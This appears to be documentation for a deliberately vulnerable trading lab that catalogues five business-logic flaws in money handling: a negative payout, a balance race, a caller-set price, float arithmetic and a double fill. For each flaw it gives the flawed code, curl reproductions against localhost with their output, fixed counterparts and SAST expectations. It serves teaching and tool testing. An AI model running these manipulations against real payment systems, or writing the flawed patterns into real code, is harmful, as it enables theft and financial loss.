# `LOGIC` — business-logic flaws

Five flaws in the rules that move money, all in `trading`: an amount nobody bounds (`LOGIC-001`), a balance read and then written (`LOGIC-002`), a price the caller names (`LOGIC-003`), money in a float (`LOGIC-004`), and a fill that is two writes instead of one transaction (`LOGIC-005`). Their protected counterparts are in `apps/trading/src/wallets/withdraw.resolver.ts`, `apps/trading/src/internal/internal.controller.ts`, `apps/trading/src/orders/place-order.resolver.ts`, `apps/trading/src/orders/buy-at-market.resolver.ts`, `apps/trading/src/money/convert-exact.resolver.ts`, `apps/trading/src/markets/tick-prices.resolver.ts` and `apps/trading/src/orders/settle-order.resolver.ts`.

`$URL` is trading's HTTP/1.1 relay: the service speaks HTTP/2 in cleartext, which curl cannot send, and the relay changes nothing in a request. `LOGIC-001`, `LOGIC-003` and `LOGIC-004` keep the reproductions their builder ran on 2026-11-27 against the service alone on `127.0.0.1:4202`, through the relay on `127.0.0.1:4212`. `LOGIC-002` and `LOGIC-005` were run again on 2026-11-28 against the whole lab, started by `pnpm start` on the port set 4600, 4601 to 4603, 4611, 4612, with the store reset to the fake data between reproductions by `POST /api/v1/lab/reset` on the gateway. `$A` is Alice's token, `$E` Erin's, `$AD` the administrator's, each obtained through the gateway's `signIn`; Erin starts with 500.00 dollars. Each counterpart's claim is scoped: this operation, receiving the identical input, keeps the money whole for the reason given. Nothing here says any operation is secure in general.

<a id="logic-001"></a>
## LOGIC-001 — `payout`: a negative amount credits the wallet

<a id="logic-001-agent"></a>
### LOGIC-001 — agent reference

- **Service:** `trading`.
- **Source:** `apps/trading/src/wallets/payout.resolver.ts`
- **Operation:** GraphQL `payout(amount: Decimal!)`, a signed-in user.
- **Sink:** `@Args('amount', { type: () => DecimalScalar }) amount: string`: the amount is taken exactly as it came.
- **Flow:** `args.amount` → `balance = balance - amount`: a negative payout is a deposit.
- **Counterparts:** `apps/trading/src/wallets/withdraw.resolver.ts` (`withdraw`: the amount is checked before any balance changes), `apps/trading/src/internal/internal.controller.ts` (`POST /internal/wallets/withdraw`: the route's schema refuses an amount at or below zero).
- **Tests:** `apps/trading/test/scenarios/logic.int-spec.ts`.
- **Expected finding:** yes. A SAST tool must report an amount used in a balance change with no bound on its sign: CWE-20.

<a id="logic-001-student"></a>
### LOGIC-001 — student guide

A payout subtracts: the wallet's balance goes down by the amount. An amount nobody bounds can be negative, and subtracting a negative number adds. Nothing in the operation says a payout is money leaving, so the arithmetic is all the caller needs.

The line (`apps/trading/src/wallets/payout.resolver.ts`):

```ts
// LOGIC-001 / CWE-20: the amount is taken exactly as it came; a negative payout is a deposit
@Args('amount', { type: () => DecimalScalar }) amount: string,
```

<a id="logic-001-exploit"></a>
### LOGIC-001 — exploit lab

Run on 2026-11-27 against the service alone, on `127.0.0.1:4202`, through the HTTP/1.1 relay on `127.0.0.1:4212`. `$A` is Alice's token. `log001.json` holds the variables `{"amount": "-500.00"}`.

```console
$ curl -s $URL/graphql -H 'content-type: application/json' -H "authorization: Bearer $A" -d @log001.json
# {"amount": "-500.00"}
{"data":{"payout":[...,{"asset":"USD","balance":"10500.00"},...]}}
```

Alice withdrew minus five hundred dollars and gained five hundred: 10000.00 became 10500.00.

<a id="logic-001-safe"></a>
### LOGIC-001 — vulnerable and protected

| | Operation | What it does with the same amount |
| --- | --- | --- |
| Vulnerable | `payout(amount)` | Subtracts it as it came: a negative amount is a deposit |
| Counterpart 1 | `withdraw(amount)` | Checks the amount before any balance changes: `BAD_USER_INPUT`, `The smallest withdrawal is 0.01 (@Min(0.01) on the amount)` |
| Counterpart 2 | `POST /internal/wallets/withdraw` | The route's schema refuses an amount at or below zero: HTTP `400`, `amount must be above zero` |

**Scoped claim.** Each counterpart defeats this flaw for identical input: the `-500.00` that credits Alice's wallet through `payout` is refused by both, each naming the rule that refuses it, before any balance is read. The claim is not that an amount above zero is always a legitimate withdrawal; only that this negative one moves no money through them.

<a id="logic-001-tests"></a>
### LOGIC-001 — tests

`apps/trading/test/scenarios/logic.int-spec.ts`, describe `LOGIC-001 — payout accepts a negative amount`. One payload, the amount `-500.00`, sent to the vulnerable operation and to each protected counterpart:

- **The exploit:** the payout of minus five hundred credits the wallet.
- **Counterpart 1:** the GraphQL counterpart refuses it: below the minimum, `BAD_USER_INPUT`.
- **Counterpart 2:** the REST counterpart refuses it: 400, the amount must be above zero.

The collection `postman/trading/vuln-nestjs.trading.postman_collection.json` carries the request `LOGIC-001 payout of a negative amount credits the wallet`.

<a id="logic-002"></a>
## LOGIC-002 — `payout`: the balance is read, then written

<a id="logic-002-agent"></a>
### LOGIC-002 — agent reference

- **Service:** `trading`.
- **Source:** `apps/trading/src/wallets/payout.resolver.ts`
- **Operation:** GraphQL `payout(amount: Decimal!)`, a signed-in user.
- **Sink:** the balance read by `findOneBy` and written further down by a separate `update`, with nothing between the two.
- **Flow:** `findOneBy(balance)` → … → `update(balance - amount)`: between the two statements any number of payouts run.
- **Counterparts:** `apps/trading/src/wallets/withdraw.resolver.ts` (`withdraw`: one conditional update per change, the affected rows checked), `apps/trading/src/internal/internal.controller.ts` (`POST /internal/wallets/withdraw`: one transaction with `SELECT … FOR UPDATE`).
- **Tests:** `apps/trading/test/scenarios/logic.int-spec.ts`.
- **Expected finding:** yes. A SAST tool must report a balance checked in one statement and changed in another: CWE-367.

<a id="logic-002-student"></a>
### LOGIC-002 — student guide

The operation reads the balance, decides whether it covers the amount, and writes the new balance in a second statement. Between the read and the write, any number of other payouts run, and each of them reads the same balance the first one did. Each is told the money is there, and each writes its own subtraction; the ledger, which every payout appends to, keeps the truth.

The line (`apps/trading/src/wallets/payout.resolver.ts`):

```ts
// LOGIC-002 / CWE-367: the balance is read here and written below; between the two, any number of other payouts run
const wallet = await this.dataSource.getRepository(WalletEntity).findOneBy({ userId: caller, asset: 'USD' });
```

<a id="logic-002-exploit"></a>
### LOGIC-002 — exploit lab

Run on 2026-11-28 against the whole lab on the port set 4600, 4601 to 4603, 4611, 4612, after a reset. `log002.json` holds the variables `{"amount": "500.00"}`. Ten parallel payouts of 500.00 out of Erin's 500.00:

```console
$ seq 10 | xargs -P 10 -I{} curl -s $URL/graphql -H 'content-type: application/json' \
    -H "authorization: Bearer $E" -d @log002.json -o /dev/null -w "%{http_code} "
200 200 200 200 200 200 200 200 200 200
```

All ten were answered. Erin's ledger afterwards, the withdrawals counted and summed:

```console
$ curl -s $URL/graphql -H 'content-type: application/json' -H "authorization: Bearer $E" \
    -d '{"query":"{ ledger { asset amount kind } }"}' \
    | jq -c '[.data.ledger[] | select(.kind == "WITHDRAWAL")] | {withdrawals: length, sum: (map(.amount | tonumber) | add)}'
{"withdrawals":10,"sum":-5000}
```

And her dollar balance:

```console
$ curl -s $URL/graphql -H 'content-type: application/json' -H "authorization: Bearer $E" \
    -d '{"query":"{ wallet { asset balance } }"}' | jq -c '.data.wallet[] | select(.asset == "USD")'
{"asset":"USD","balance":"-1500.00"}
```

Five thousand dollars were paid out of a balance of five hundred, and the balance ended below zero. The balance itself is whichever write landed last, each computed from a read some of the others had already made stale: it differs from one run to the next (an earlier run of the same ten ended at −2500.00). The ledger does not: ten withdrawals, minus five thousand.

**Counterpart 1 — `withdraw`, ten parallel.** One conditional `UPDATE … WHERE balance + ? >= 0`, the affected rows checked. `log002w.json` holds the same variables, with the `withdraw` mutation; each answer is kept in a file of its own:

```console
$ seq 10 | xargs -P 10 -I{} curl -s $URL/graphql -H 'content-type: application/json' \
    -H "authorization: Bearer $E" -d @log002w.json -o answer-{}.json
$ jq -c 'if .errors then {errors: [.errors[].extensions.code]} else .data end' answer-*.json | sort | uniq -c
   9 {"errors":["CONFLICT"]}
   1 {"withdraw":[{"asset":"BTC","balance":"0.00000000"},{"asset":"DOGE","balance":"0.00000000"},{"asset":"ETH","balance":"0.00000000"},{"asset":"SOL","balance":"0.00000000"},{"asset":"USD","balance":"0.00"},{"asset":"XRP","balance":"0.00000000"}]}
```

One answered, nine refused `CONFLICT`. The same two readings as above answer `{"withdrawals":1,"sum":-500.00}` and `{"asset":"USD","balance":"0.00"}`: one withdrawal, balance 0.00.

**Counterpart 2 — `POST /internal/wallets/withdraw`, ten parallel.** One transaction with `SELECT … FOR UPDATE`:

```console
$ seq 10 | xargs -P 10 -I{} curl -s -o answer-{}.json -w "%{http_code} " $URL/internal/wallets/withdraw \
    -H 'content-type: application/json' -H "authorization: Bearer $E" -d '{"amount":"500.00"}'
400 200 400 400 400 400 400 400 400 400
$ jq -c . answer-*.json | sort | uniq -c
   9 {"message":"The USD balance is below 500.00","error":"Bad Request","statusCode":400}
   1 {"wallets":[{"id":"26","userId":"u-erin","asset":"BTC","balance":"0.00000000"},{"id":"30","userId":"u-erin","asset":"DOGE","balance":"0.00000000"},{"id":"27","userId":"u-erin","asset":"ETH","balance":"0.00000000"},{"id":"28","userId":"u-erin","asset":"SOL","balance":"0.00000000"},{"id":"25","userId":"u-erin","asset":"USD","balance":"0.00"},{"id":"29","userId":"u-erin","asset":"XRP","balance":"0.00000000"}]}
```

One answered, nine refused, and again `{"withdrawals":1,"sum":-500.00}` and `{"asset":"USD","balance":"0.00"}`. Which of the ten is answered is the interleaving's; the counts are not.

<a id="logic-002-safe"></a>
### LOGIC-002 — vulnerable and protected

| | Operation | What it does with the same ten requests |
| --- | --- | --- |
| Vulnerable | `payout(amount)` | Each request reads a balance the others have not yet written and subtracts from it: ten payouts of 500.00 leave, five thousand out of five hundred |
| Counterpart 1 | `withdraw(amount)` | One conditional update per change, `UPDATE … WHERE balance + ? >= 0`, the affected rows checked: the first takes the balance to zero, the other nine change no row and answer `CONFLICT` |
| Counterpart 2 | `POST /internal/wallets/withdraw` | One transaction holding `SELECT … FOR UPDATE` on the row: the first takes the balance to zero, the other nine read zero and answer 400, `The USD balance is below 500.00` |

**Scoped claim.** Each counterpart defeats this flaw for identical input: the ten concurrent payouts that leave five thousand dollars paid out of a five-hundred-dollar balance through `payout` pay out five hundred through either counterpart, once, whatever the order the requests arrive in. The claim is not that one conditional update makes every wallet operation safe against every race; only that these ten requests cannot overdraw this balance through them.

<a id="logic-002-tests"></a>
### LOGIC-002 — tests

`apps/trading/test/scenarios/logic.int-spec.ts`, describe `LOGIC-002 — ten parallel payouts out of five hundred dollars`. Ten requests of the same amount, fired with `Promise.all`, and the end state asserted:

- **The exploit:** the ten payouts are all answered: five thousand paid out of five hundred. The ledger holds ten withdrawals summing to −5000.
- **Counterpart 1:** the GraphQL counterpart answers once and refuses nine: one conditional update. The nine carry `CONFLICT`; the balance is 0.00 and the ledger one withdrawal.
- **Counterpart 2:** the REST counterpart answers once and refuses nine: one transaction, `FOR UPDATE`. The nine answer 400; the balance is 0.00 and the ledger one withdrawal.

The collection `postman/trading/vuln-nestjs.trading.postman_collection.json` carries the request `LOGIC-002 ten parallel payouts pay five thousand out of five hundred`.

<a id="logic-003"></a>
## LOGIC-003 — `quickBuy`: the caller's price is the price

<a id="logic-003-agent"></a>
### LOGIC-003 — agent reference

- **Service:** `trading`.
- **Source:** `apps/trading/src/orders/quick-buy.resolver.ts`
- **Operation:** GraphQL `quickBuy(symbol: String!, quantity: Decimal!, price: Decimal!)`, a signed-in user.
- **Sink:** `@Args('price', { type: () => DecimalScalar }) price: string`: the caller's price is the price.
- **Flow:** `args.price` → `costOf(quantity, price)` → the balance is charged the caller's own number.
- **Counterparts:** `apps/trading/src/orders/place-order.resolver.ts` (`placeOrder`: the input has no price field), `apps/trading/src/orders/buy-at-market.resolver.ts` (`buyAtMarket`: the price is computed on the server).
- **Tests:** `apps/trading/test/scenarios/logic.int-spec.ts`.
- **Expected finding:** yes. A SAST tool must report a charge computed from a price the caller supplies: CWE-840.

<a id="logic-003-student"></a>
### LOGIC-003 — student guide

A market order buys at the market's price. `quickBuy` takes the price as an argument and charges what that argument says, so the cost of the order is the caller's arithmetic: a fraction of a coin at a fraction of a cent costs almost nothing, and what almost nothing rounds to is zero.

The line (`apps/trading/src/orders/quick-buy.resolver.ts`):

```ts
// LOGIC-003 / CWE-840: the caller's price is the price; a fraction of a coin at a fraction of a cent rounds to nothing
@Args('price', { type: () => DecimalScalar }) price: string,
```

<a id="logic-003-exploit"></a>
### LOGIC-003 — exploit lab

Run on 2026-11-27 against the service alone, on `127.0.0.1:4202`, through the HTTP/1.1 relay on `127.0.0.1:4212`. `$A` is Alice's token.

```console
$ curl -s $URL/graphql -H 'content-type: application/json' -H "authorization: Bearer $A" -d @log003.json
# {"symbol": "BTC-USD", "quantity": "0.00010000", "price": "0.01"}
{"data":{"quickBuy":{"status":"FILLED","limitPrice":"0.01","quantity":"0.00010000"}}}
```

A ten-thousandth of a bitcoin at a hundredth of a cent costs 0.0001 cents, which rounds to zero: the coin was bought for 0.00 dollars, and Alice's USD balance did not move.

**Counterpart 1 — `placeOrder(input: PlaceOrderInput!)`.** There is no price field to send: the schema refuses the payload with the same body, `"Field \"price\" is not defined by type \"PlaceOrderInput\""`, `BAD_USER_INPUT`.

**Counterpart 2 — `buyAtMarket(symbol, quantity)`.** The price is computed on the server: it is the reference price itself, and nothing is added to it. The same quantity costs 6.50:

```console
$ curl -s $URL/graphql -H 'content-type: application/json' -H "authorization: Bearer $A" -d @log003c2.json
{"data":{"buyAtMarket":{"status":"FILLED","limitPrice":"65000.00"}}}
$ # Alice's wallets afterwards:
[{'asset': 'BTC', 'balance': '0.00010000'}, ..., {'asset': 'USD', 'balance': '9993.50'}, ...]
```

<a id="logic-003-safe"></a>
### LOGIC-003 — vulnerable and protected

| | Operation | What it does with the same quantity |
| --- | --- | --- |
| Vulnerable | `quickBuy(symbol, quantity, price)` | Charges the price the caller named: a coin for 0.00 dollars |
| Counterpart 1 | `placeOrder(input)` | Has no price field: the schema refuses the argument before any code runs, `BAD_USER_INPUT` |
| Counterpart 2 | `buyAtMarket(symbol, quantity)` | Takes no price: the server's reference price is the price, and the same quantity costs 6.50 |

**Scoped claim.** Each counterpart defeats this flaw for identical input: the price of `0.01` that buys a ten-thousandth of a bitcoin for nothing through `quickBuy` is not an argument of either counterpart, so the market's price decides. The claim is not that the reference price is fair or that a market order cannot lose money; only that this caller's price is not charged through them.

<a id="logic-003-tests"></a>
### LOGIC-003 — tests

`apps/trading/test/scenarios/logic.int-spec.ts`, describe `LOGIC-003 — quickBuy takes the caller's price`. One payload, sent to the vulnerable operation and to each protected counterpart:

- **The exploit:** a ten-thousandth of a bitcoin is bought for nothing.
- **Counterpart 1:** the placeOrder counterpart: no price field exists to send.
- **Counterpart 2:** the buyAtMarket counterpart charges the server's price: 6.50.

The collection `postman/trading/vuln-nestjs.trading.postman_collection.json` carries the request `LOGIC-003 quickBuy takes the caller’s price`.

<a id="logic-004"></a>
## LOGIC-004 — `convert`: money in a float

<a id="logic-004-agent"></a>
### LOGIC-004 — agent reference

- **Service:** `trading`.
- **Source:** `apps/trading/src/money/convert.resolver.ts`
- **Operation:** GraphQL `convert(asset: Asset!, amount: Float!)`, a signed-in user.
- **Sink:** `const minor = Math.floor(amount * 10 ** scaleOf(asset))`: binary floating point on money.
- **Flow:** `args.amount` (`Float`) → `Math.floor(amount * 10 ** scale)`: 8.2 dollars is 819.9999… cents as a float.
- **Counterparts:** `apps/trading/src/money/convert-exact.resolver.ts` (`convertExact`: a decimal library with the rounding mode named), `apps/trading/src/orders/place-order.resolver.ts` (`placeOrder`: money is a decimal string on the wire and integer minor units in the store).
- **Tests:** `apps/trading/test/scenarios/logic.int-spec.ts`.
- **Expected finding:** yes. A SAST tool must report money arithmetic in binary floating point: CWE-682.

<a id="logic-004-student"></a>
### LOGIC-004 — student guide

A float cannot hold most decimal fractions exactly: 8.2 is 8.1999999999999993 in binary double precision, and multiplying it by a hundred gives 819.9999999999999. Flooring that to an integer of minor units drops a cent that was never missing. Whoever holds the difference, gains it: a conversion that loses a unit on every amount is a drain with no tap.

The line (`apps/trading/src/money/convert.resolver.ts`):

```ts
// LOGIC-004 / CWE-682: binary floating point on money: 8.2 dollars is 819.9999… cents when multiplied as a float
const minor = Math.floor(amount * 10 ** scaleOf(asset));
```

<a id="logic-004-exploit"></a>
### LOGIC-004 — exploit lab

Run on 2026-11-27 against the service alone, on `127.0.0.1:4202`, through the HTTP/1.1 relay on `127.0.0.1:4212`. `$A` is Alice's token.

```console
$ curl -s $URL/graphql -H 'content-type: application/json' -H "authorization: Bearer $A" \
    -d '{"query":"query($asset: Asset!, $amount: Float!) { convert(asset: $asset, amount: $amount) }",
         "variables":{"asset":"USD","amount":8.2}}'
{"data":{"convert":"8.19"}}
```

Eight dollars twenty became eight nineteen: a minor unit was lost to the binary representation of 8.2, and whoever holds the difference gained it.

**Counterpart 1 — `convertExact(asset, amount)`.** A decimal library with the rounding mode named (half up, at the asset's scale):

```console
$ curl -s $URL/graphql -H 'content-type: application/json' -H "authorization: Bearer $A" \
    -d '{"query":"mutation($asset: Asset!, $amount: Decimal!) { convertExact(asset: $asset, amount: $amount) }",
         "variables":{"asset":"USD","amount":"8.2"}}'
{"data":{"convertExact":"8.20"}}
```

**Counterpart 2 — `placeOrder`.** Money is a decimal string on the wire and integer minor units in the store; no float ever holds it. A quantity of `8.2` comes back `8.20000000` (820000000 minor units).

<a id="logic-004-safe"></a>
### LOGIC-004 — vulnerable and protected

| | Operation | What it does with the same amount |
| --- | --- | --- |
| Vulnerable | `convert(asset, amount)` | Multiplies a float and floors it: 8.2 becomes 8.19 |
| Counterpart 1 | `convertExact(asset, amount)` | Rounds with a decimal library, half up at the asset's scale: 8.2 becomes 8.20 |
| Counterpart 2 | `placeOrder(input)` | Carries the amount as a decimal string and integer minor units: `8.2` comes back `8.20000000` |

**Scoped claim.** Each counterpart defeats this flaw for identical input: the `8.2` that loses a cent through `convert` arrives whole through both counterparts, because neither multiplies it as a float. The claim is not that integer minor units or a decimal library suit every money calculation; only that this amount loses no unit through them.

<a id="logic-004-tests"></a>
### LOGIC-004 — tests

`apps/trading/test/scenarios/logic.int-spec.ts`, describe `LOGIC-004 — convert does money in floating point`. One amount, `8.2`, sent to the vulnerable operation and to each protected counterpart:

- **The exploit:** eight dollars twenty becomes eight nineteen.
- **Counterpart 1:** the convertExact counterpart: a decimal library, half up, 8.20.
- **Counterpart 2:** the placeOrder counterpart carries 8.2 as integer minor units.

The collection `postman/trading/vuln-nestjs.trading.postman_collection.json` carries the request `LOGIC-004 convert loses a minor unit to the float`.

<a id="logic-005"></a>
## LOGIC-005 — `matchOrder`: an order filled twice

<a id="logic-005-agent"></a>
### LOGIC-005 — agent reference

- **Service:** `trading`.
- **Source:** `apps/trading/src/orders/match-order.resolver.ts`
- **Operation:** GraphQL `matchOrder(orderId: ID!)`, an administrator.
- **Sink:** `if (order.side === OrderSide.BUY) { await this.wallets.adjust(...); …`: the credit and the fill are two writes in no transaction.
- **Flow:** `findOneBy` (status `OPEN` seen) → `adjust` (credit) → `update` (status `FILLED`): two writes in no transaction, so two callers both see the order `OPEN`.
- **Counterparts:** `apps/trading/src/markets/tick-prices.resolver.ts` (`tickPrices`: one transaction, row locks on the crossed orders, a conditional update on the status), `apps/trading/src/orders/settle-order.resolver.ts` (`settleOrder`: a unique key on (`orderId`, `tickId`) refuses the repeat).
- **Tests:** `apps/trading/test/scenarios/logic.int-spec.ts`.
- **Expected finding:** yes. A SAST tool must report a state read, then acted on, in no transaction: CWE-362.

<a id="logic-005-student"></a>
### LOGIC-005 — student guide

Matching an order against the market credits the buyer's wallet and then marks the order filled. The two are separate writes, and nothing holds the order between them: two callers that read the order while it is still `OPEN` both credit the wallet, and both then mark it `FILLED`. The buyer is paid twice for one order.

The line (`apps/trading/src/orders/match-order.resolver.ts`):

```ts
// LOGIC-005 / CWE-362: the credit and the fill are two writes in no transaction; two callers both see the order OPEN
if (order.side === OrderSide.BUY) {
  await this.wallets.adjust(...);
```

<a id="logic-005-exploit"></a>
### LOGIC-005 — exploit lab

Run on 2026-11-28 against the whole lab on the port set 4600, 4601 to 4603, 4611, 4612, after a reset. `$AD` is the administrator's token. `log005.json` holds the variables `{"orderId": "1"}`. Two parallel calls on order 1, Alice's resting buy of 0.5 BTC:

```console
$ curl -s $URL/graphql -H 'content-type: application/json' -H "authorization: Bearer $AD" -d @log005.json &
$ curl -s $URL/graphql -H 'content-type: application/json' -H "authorization: Bearer $AD" -d @log005.json &
{"data":{"matchOrder":{"id":"1","status":"FILLED"}}}
{"data":{"matchOrder":{"id":"1","status":"FILLED"}}}
```

Both callers saw the order `OPEN`. Alice's bitcoin wallet afterwards:

```console
$ curl -s $URL/graphql -H 'content-type: application/json' -H "authorization: Bearer $A" \
    -d '{"query":"{ wallet { asset balance } }"}' | jq -c '.data.wallet[] | select(.asset == "BTC")'
{"asset":"BTC","balance":"1.00000000"}
```

Twice 0.5 was credited, 1.00000000 BTC in all. And the trades order 1 holds, the seed's two included:

```console
$ curl -s $URL/graphql -H 'content-type: application/json' \
    -d '{"query":"query($symbol: String!) { trades(symbol: $symbol, limit: 200) { orderId } }","variables":{"symbol":"BTC-USD"}}' \
    | jq -c '[.data.trades[] | select(.orderId == "1")] | length'
4
```

Two trades were written for one order.

**Counterpart 1 — `tickPrices`, twice in parallel.** One transaction, row locks on the crossed orders, a conditional update on the status. The first step is minus two percent, which crosses Alice's buy at 64000.00:

```console
$ curl -s $URL/graphql -H 'content-type: application/json' -H "authorization: Bearer $AD" -d '{"query":"mutation { tickPrices { symbol referencePrice } }"}' &
$ curl -s $URL/graphql -H 'content-type: application/json' -H "authorization: Bearer $AD" -d '{"query":"mutation { tickPrices { symbol referencePrice } }"}' &
{"data":{"tickPrices":[{"symbol":"BTC-USD","referencePrice":"63700.00"},{"symbol":"DOGE-USD","referencePrice":"0.12"},{"symbol":"ETH-USD","referencePrice":"3136.00"},{"symbol":"SOL-USD","referencePrice":"147.00"},{"symbol":"XRP-USD","referencePrice":"0.49"}]}}
{"data":{"tickPrices":[{"symbol":"BTC-USD","referencePrice":"63700.00"},{"symbol":"DOGE-USD","referencePrice":"0.12"},{"symbol":"ETH-USD","referencePrice":"3136.00"},{"symbol":"SOL-USD","referencePrice":"147.00"},{"symbol":"XRP-USD","referencePrice":"0.49"}]}}
```

Filled once, credited once, one trade:

```console
$ curl -s $URL/graphql -H 'content-type: application/json' -H "authorization: Bearer $AD" \
    -d '{"query":"query($id: ID!) { orderDetails(id: $id) { id status } }","variables":{"id":"1"}}'
{"data":{"orderDetails":{"id":"1","status":"FILLED"}}}
$ curl -s $URL/graphql -H 'content-type: application/json' -H "authorization: Bearer $A" \
    -d '{"query":"{ wallet { asset balance } }"}' | jq -c '.data.wallet[] | select(.asset == "BTC")'
{"asset":"BTC","balance":"0.50000000"}
$ curl -s $URL/graphql -H 'content-type: application/json' \
    -d '{"query":"query($symbol: String!) { trades(symbol: $symbol, limit: 200) { orderId } }","variables":{"symbol":"BTC-USD"}}' \
    | jq -c '[.data.trades[] | select(.orderId == "1")] | length'
3
```

**Counterpart 2 — `settleOrder(orderId, tickId)`, the same tick twice.** The unique key on (`orderId`, `tickId`) refuses the repeat. `log005c2.json` holds the variables `{"orderId": "1", "tickId": "tick-scenario-5"}`:

```console
$ curl -s $URL/graphql -H 'content-type: application/json' -H "authorization: Bearer $AD" -d @log005c2.json
{"data":{"settleOrder":{"id":"1","status":"FILLED"}}}
$ curl -s $URL/graphql -H 'content-type: application/json' -H "authorization: Bearer $AD" -d @log005c2.json
{"data":{"settleOrder":{"id":"1","status":"FILLED"}}}
```

Both calls answer `FILLED`, and nothing is credited twice: the same two readings answer `{"asset":"BTC","balance":"0.50000000"}` and `3`.

<a id="logic-005-safe"></a>
### LOGIC-005 — vulnerable and protected

| | Operation | What it does with the same two calls |
| --- | --- | --- |
| Vulnerable | `matchOrder(orderId)` | Two callers both read the order `OPEN` and both credit the wallet: 1.00000000 BTC for an order of 0.5, and two trades |
| Counterpart 1 | `tickPrices` | One transaction with row locks on the crossed orders and a conditional update on the status: the second caller waits, then sees the order `FILLED` and changes nothing |
| Counterpart 2 | `settleOrder(orderId, tickId)` | A unique key on (`orderId`, `tickId`): the second settlement of one tick answers the order as it is and writes no second trade, so no second credit |

**Scoped claim.** Each counterpart defeats this flaw for identical input: the second call that credits Alice's wallet a second time through `matchOrder` credits nothing through either counterpart, whichever of the two arrives second. The claim is not that a transaction or a unique key settles every race in the service; only that this order is filled and credited once through them.

<a id="logic-005-tests"></a>
### LOGIC-005 — tests

`apps/trading/test/scenarios/logic.int-spec.ts`, describe `LOGIC-005 — matchOrder fills an order twice`. The races fire their requests with `Promise.all` and assert the end state, each read against the seed's baseline (order 1 already has two seeded trades):

- **The exploit:** two parallel matchOrder calls credit half a bitcoin twice: two calls answered, 1.00000000 BTC in Alice's wallet, two trades more for order 1.
- **Counterpart 1:** the tickPrices counterpart, twice in parallel: filled once, one trade.
- **Counterpart 2:** the settleOrder counterpart, the same tick twice: one trade, the unique key.

The collection `postman/trading/vuln-nestjs.trading.postman_collection.json` carries the request `LOGIC-005 matchOrder fills an open order`.
